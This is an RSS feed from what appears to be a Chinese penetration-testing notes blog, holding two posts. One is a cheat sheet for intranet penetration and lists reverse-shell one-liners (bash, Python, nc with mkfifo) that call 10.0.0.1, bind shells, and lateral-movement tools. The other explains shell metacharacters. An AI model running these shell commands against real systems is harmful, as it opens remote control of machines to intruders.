<?xml version="1.0"?>
<rss version="2.0">
    <channel>
        <title>Khala • Posts by &#34;shell&#34; tag</title>
        <link>https://mobius-0.github.io</link>
        <description>GLHF</description>
        <language>zh-CN</language>
        <pubDate>Tue, 29 Nov 2022 15:50:20 +0800</pubDate>
        <lastBuildDate>Tue, 29 Nov 2022 15:50:20 +0800</lastBuildDate>
        <category>Hexo</category>
        <category>shoya</category>
        <category>网站</category>
        <category>网络安全</category>
        <category>工具</category>
        <category>虚拟机</category>
        <category>安全</category>
        <category>星际争霸2</category>
        <category>平衡</category>
        <category>杂谈</category>
        <category>小说</category>
        <category>江南</category>
        <category>龙族</category>
        <category>动画</category>
        <category>法律法规</category>
        <category>XSS</category>
        <category>漏洞</category>
        <category>渗透测试</category>
        <category>靶场</category>
        <category>pikachu</category>
        <category>标准</category>
        <category>OCI</category>
        <category>CRI</category>
        <category>HTTP</category>
        <category>计算机网络</category>
        <category>IPSec</category>
        <category>VPN</category>
        <category>SSL</category>
        <category>TLS</category>
        <category>WiFi</category>
        <category>邮件</category>
        <category>网络协议</category>
        <category>Linux</category>
        <category>渗透</category>
        <category>信息收集</category>
        <category>痕迹清理</category>
        <category>Windows</category>
        <category>内网</category>
        <category>后门</category>
        <category>免杀</category>
        <category>代理</category>
        <category>Shell</category>
        <category>远程连接</category>
        <category>入侵检测</category>
        <category>IDS</category>
        <category>IPS</category>
        <category>防御加固</category>
        <category>管理策略</category>
        <category>分工</category>
        <category>职能</category>
        <category>情报</category>
        <category>运营</category>
        <category>应急响应</category>
        <category>流程</category>
        <category>攻击溯源</category>
        <category>分析模型</category>
        <category>网络攻防</category>
        <category>蜜罐</category>
        <category>隐藏</category>
        <category>诱导</category>
        <category>防御纵深</category>
        <category>访问控制</category>
        <category>过滤</category>
        <category>框架</category>
        <category>风险</category>
        <category>控制</category>
        <category>CSRF</category>
        <category>服务器</category>
        <category>SQL注入</category>
        <category>SSRF</category>
        <category>Cache</category>
        <category>XXE</category>
        <category>XML</category>
        <category>Xpath</category>
        <category>注入</category>
        <category>函数</category>
        <category>绕过</category>
        <category>遍历</category>
        <category>包含</category>
        <category>文件</category>
        <category>目录</category>
        <category>读取</category>
        <category>上传</category>
        <category>中间件</category>
        <category>IIS</category>
        <category>Apache</category>
        <category>Nginx</category>
        <category>域名</category>
        <category>DNS</category>
        <category>WEB</category>
        <category>虚拟化</category>
        <category>Docker</category>
        <category>镜像</category>
        <category>逻辑</category>
        <category>策略配置</category>
        <category>ASP</category>
        <category>CSharp</category>
        <category>Golang</category>
        <category>Java</category>
        <category>语言</category>
        <category>反序列化</category>
        <category>混淆</category>
        <category>沙箱</category>
        <category>类</category>
        <category>JDK</category>
        <category>开发过程</category>
        <category>JavaScript</category>
        <category>PHP</category>
        <category>PowerShell</category>
        <category>Python</category>
        <category>Ruby</category>
        <category>端口</category>
        <category>社会工程学</category>
        <category>搜索</category>
        <item>
            <guid isPermalink="true">https://mobius-0.github.io/security/WebNote/Intranet%20penetration/%E7%BB%BC%E5%90%88%E6%8A%80%E5%B7%A7/</guid>
            <title>综合技巧</title>
            <link>https://mobius-0.github.io/security/WebNote/Intranet%20penetration/%E7%BB%BC%E5%90%88%E6%8A%80%E5%B7%A7/</link>
            <category>代理</category>
            <category>Shell</category>
            <category>远程连接</category>
            <pubDate>Tue, 29 Nov 2022 15:50:20 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;端口转发&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#端口转发&#34;&gt;#&lt;/a&gt; 端口转发&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;windows&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;lcx&lt;/li&gt;
&lt;li&gt;netsh&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;linux&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;portmap&lt;/li&gt;
&lt;li&gt;iptables&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;socket 代理&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Win: xsocks&lt;/li&gt;
&lt;li&gt;Linux: proxychains&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;基于 http 的转发与 socket 代理 (低权限下的渗透)&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;端口转发: tunnasocks 代理: reGeorg&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;ssh 通道&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;端口转发 socks&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;获取shell&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#获取shell&#34;&gt;#&lt;/a&gt; 获取 shell&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;常规 shell 反弹&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/10.0.0.1/8080 0&amp;gt;&amp;amp;1

python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&amp;quot;10.0.0.1&amp;quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&amp;quot;/bin/sh&amp;quot;,&amp;quot;-i&amp;quot;]);&#39;

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.0.0.1 1234 &amp;gt;/tmp/f
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;突破防火墙的 imcp_shell 反弹&lt;/li&gt;
&lt;li&gt;正向 shell&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;nc -e /bin/sh -lp 1234
nc.exe -e cmd.exe -lp 1234
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;内网文件传输&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#内网文件传输&#34;&gt;#&lt;/a&gt; 内网文件传输&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;windows 下文件传输&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;powershell&lt;/li&gt;
&lt;li&gt;vbs 脚本文件&lt;/li&gt;
&lt;li&gt;bitsadmin&lt;/li&gt;
&lt;li&gt;文件共享&lt;/li&gt;
&lt;li&gt;使用 telnet 接收数据&lt;/li&gt;
&lt;li&gt;hta&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;linux 下文件传输&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;python&lt;/li&gt;
&lt;li&gt;wget&lt;/li&gt;
&lt;li&gt;tar + ssh&lt;/li&gt;
&lt;li&gt;利用 dns 传输数据&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;文件编译&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;powershell 将 exe 转为 txt，再 txt 转为 exe&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;远程连接-执行程序&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#远程连接-执行程序&#34;&gt;#&lt;/a&gt; 远程连接 &amp;amp;&amp;amp; 执行程序&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;at&amp;amp;schtasks&lt;/li&gt;
&lt;li&gt;psexec&lt;/li&gt;
&lt;li&gt;wmic&lt;/li&gt;
&lt;li&gt;wmiexec.vbs&lt;/li&gt;
&lt;li&gt;smbexec&lt;/li&gt;
&lt;li&gt;powershell remoting&lt;/li&gt;
&lt;li&gt;SC 创建服务执行&lt;/li&gt;
&lt;li&gt;schtasks&lt;/li&gt;
&lt;li&gt;SMB+MOF || DLL Hijacks&lt;/li&gt;
&lt;li&gt;PTH + compmgmt.msc&lt;/li&gt;
&lt;/ul&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mobius-0.github.io/security/WebNote/Languages%20and%20Frameworks/Shell/</guid>
            <title>Shell</title>
            <link>https://mobius-0.github.io/security/WebNote/Languages%20and%20Frameworks/Shell/</link>
            <category>Linux</category>
            <category>Shell</category>
            <pubDate>Mon, 28 Nov 2022 10:48:11 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;简介&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#简介&#34;&gt;#&lt;/a&gt; 简介&lt;/h1&gt;
&lt;p&gt;Shell 是一个特殊的程序，是用户使用 Linux 的桥梁。Shell 既是一种命令，又是一种程序设计语言。&lt;/p&gt;
&lt;p&gt;Linux 包含多种 Shell ，常见的有：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Bourne Shell（ATT 的 Bourne 开发，名为 sh）&lt;/li&gt;
&lt;li&gt;Bourne Again Shell（/bin/bash）&lt;/li&gt;
&lt;li&gt;C Shell（Bill Joy 开发，名为 csh）&lt;/li&gt;
&lt;li&gt;K Shell（ATT 的 David G.koun 开发，名为 ksh）&lt;/li&gt;
&lt;li&gt;Z Shell（Paul Falstad 开发，名为 zsh）&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;元字符&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#元字符&#34;&gt;#&lt;/a&gt; 元字符&lt;/h1&gt;
&lt;p&gt;shell 一般会有一系列特殊字符，用来实现的一定的效果，这种字符被称为元字符（Meta），不同的 Shell 支持的元字符可能会不相同。&lt;/p&gt;
&lt;p&gt;常见的元字符如下：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;IFS&lt;/code&gt;  由 &amp;lt;space&amp;gt; 或 &amp;lt;tab&amp;gt; 或 &amp;lt;enter&amp;gt; 三者之一组成&lt;/li&gt;
&lt;li&gt;&lt;code&gt;CR&lt;/code&gt;  由 &amp;lt;enter&amp;gt; 产生。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;=&lt;/code&gt;  设定变量&lt;/li&gt;
&lt;li&gt;&lt;code&gt;$&lt;/code&gt;  作变量或运算替换&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;gt;&lt;/code&gt;  重定向 stdout&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;gt;&amp;gt;&lt;/code&gt;  追加到文件&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;&lt;/code&gt;  重定向 stdin&lt;/li&gt;
&lt;li&gt;&lt;code&gt;|&lt;/code&gt;  命令管道&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;amp;&lt;/code&gt;  后台执行命令&lt;/li&gt;
&lt;li&gt;&lt;code&gt;;&lt;/code&gt;  在前一个命令结束后，执行下一个命令&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;amp;&amp;amp;&lt;/code&gt;  在前一个命令未报错执行后，执行下一个命令&lt;/li&gt;
&lt;li&gt;&lt;code&gt;||&lt;/code&gt;  在前一个命令执行报错后，执行下一个命令&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&#39;&lt;/code&gt;  在单引号内的命令会保留原来的值&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;quot;&lt;/code&gt;  在双引号内的命令会允许变量替换&lt;/li&gt;
&lt;li&gt;&lt;code&gt;`&lt;/code&gt;  在反引号内的内容会当成命令执行并替换&lt;/li&gt;
&lt;li&gt;&lt;code&gt;()&lt;/code&gt;  在子 Shell 中执行命令&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;#123;&amp;#125;&lt;/code&gt;  在当前 Shell 中执行命令&lt;/li&gt;
&lt;li&gt;&lt;code&gt;~&lt;/code&gt;  当前用户的主目录&lt;/li&gt;
&lt;li&gt;&lt;code&gt;!number&lt;/code&gt;  执行历史命令，如  &lt;code&gt;!1&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;通配符&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#通配符&#34;&gt;#&lt;/a&gt; 通配符&lt;/h1&gt;
&lt;p&gt;除元字符外，通配符（wildcard）也是 shell 中的一种特殊字符。当 shell 在参数中遇到了通配符时，shell 会将其当作路径或文件名去在磁盘上搜寻可能的匹配：若符合要求的匹配存在，则进行替换，否则就将该通配符作为一个普通字符直接传递。&lt;/p&gt;
&lt;p&gt;常见的通配符如下：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;*&lt;/code&gt;  匹配 0 或多个字符&lt;/li&gt;
&lt;li&gt;&lt;code&gt;?&lt;/code&gt;  匹配任意一个字符&lt;/li&gt;
&lt;li&gt;&lt;code&gt;[list]&lt;/code&gt;  匹配 list 中的任意一个字符&lt;/li&gt;
&lt;li&gt;&lt;code&gt;[!list]&lt;/code&gt;  匹配除 list 外的任意一个字符&lt;/li&gt;
&lt;li&gt;&lt;code&gt;[a-c]&lt;/code&gt;  匹配 a-c 中的任意一个字符&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;#123;string1,string2,...&amp;#125;&lt;/code&gt;  分别匹配其中字符串&lt;/li&gt;
&lt;/ul&gt;
 ]]></description>
        </item>
    </channel>
</rss>
